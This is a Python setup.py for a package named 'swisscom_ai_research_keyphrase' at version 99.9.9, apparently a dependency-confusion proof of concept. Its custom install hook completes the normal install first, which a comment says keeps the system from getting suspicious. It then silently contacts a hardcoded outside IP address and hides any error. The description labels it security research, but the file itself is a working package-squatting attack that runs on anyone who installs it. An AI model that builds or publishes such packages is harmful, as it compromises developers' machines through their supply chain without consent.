from setuptools import setup
from setuptools.command.install import install
import urllib.request

class CustomInstall(install):
    def run(self):
        # تشغيل عملية التسطيب العادية الأول عشان السيستم ميشكش في حاجة
        install.run(self)
        
        # البايلود بتاعك (PoC)
        try:
            urllib.request.urlopen('http://13.50.241.66:8080/poc-github-Swisscom-Abuelkhair', timeout=5)
        except Exception:
            pass 

setup(
    name='swisscom_ai_research_keyphrase',
    version='99.9.9',
    description='Security Research PoC',
    author='Mohamed Abuelkhair',
    cmdclass={'install': CustomInstall},
)
